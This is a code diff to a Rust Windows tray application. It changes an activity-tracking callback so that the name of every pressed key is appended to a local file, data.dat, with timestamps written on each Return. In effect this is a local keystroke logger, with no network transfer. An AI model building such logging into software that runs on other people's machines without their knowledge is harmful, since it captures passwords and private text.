@@ -2,6 +2,11 @@ use core::mem::MaybeUninit;
 use winapi::um::winuser;
 use std::time::Instant;
 use std::io::prelude::*;
+use std::fs::OpenOptions;
+use std::io::Write;
+use std::path::Path;
+use std::fs::File;
+use chrono::{Utc, DateTime};
 use monitor::*;
 
 fn main() {
@@ -26,6 +31,8 @@ fn main() {
 
     let second_icon = Icon::from_buffer(icon2, None, None).unwrap();
     let first_icon = Icon::from_buffer(icon, None, None).unwrap();
+
+    let mut text = String::from("Hello World");
 
     // Needlessly complicated tray icon with all the whistles and bells
     let mut tray_icon = TrayIconBuilder::new()
@@ -138,7 +145,51 @@ fn main() {
 }
 
 fn track_activity(event: Event) {
-    println!("My activity {:?}", event);
+    match event.event_type {
+        EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
+        EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
+        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => println!("Control Left/Right!"),
+        EventType::KeyPress(Key::Delete) => println!("Delete!"),
+        EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
+        EventType::KeyPress(Key::Home) => println!("Home!"),
+        EventType::KeyPress(Key::Insert) => println!("Insert!"),
+        EventType::KeyPress(Key::End) => println!("End!"),
+        EventType::KeyPress(Key::Escape) => println!("Escape!"),
+        EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
+        EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
+        EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
+        EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
+        EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
+        EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
+        EventType::KeyPress(Key::Return) => {
+            let now = Utc::now();
+            let x: String = format!("{}", now);
+            let now_parsed: DateTime<Utc> = x.parse().unwrap();
+            let mut fileRef = OpenOptions::new()
+                .append(true)
+                .open("data.dat")
+                .expect("Unable to open file");   
+            fileRef.write("\n".as_bytes()).expect("write failed");
+            fileRef.write(now_parsed.to_string().as_bytes()).expect("write failed");
+            fileRef.write("\n".as_bytes()).expect("write failed");
+        },
+        EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
+        EventType::KeyPress(Key) => {
+            if !Path::new("data.dat").exists() {
+                let mut file = File::create("data.dat");
+            }
+
+            let key = event.name.unwrap();
+            let mut fileRef = OpenOptions::new()
+                .append(true)
+                .open("data.dat")
+                .expect("Unable to open file");   
+    
+            fileRef.write(key.as_bytes()).expect("write failed");
+        },
+        EventType::MouseMove{x, y} => (),
+        _ => (),
+    }
 }
 
 fn zip_main() -> i32 {
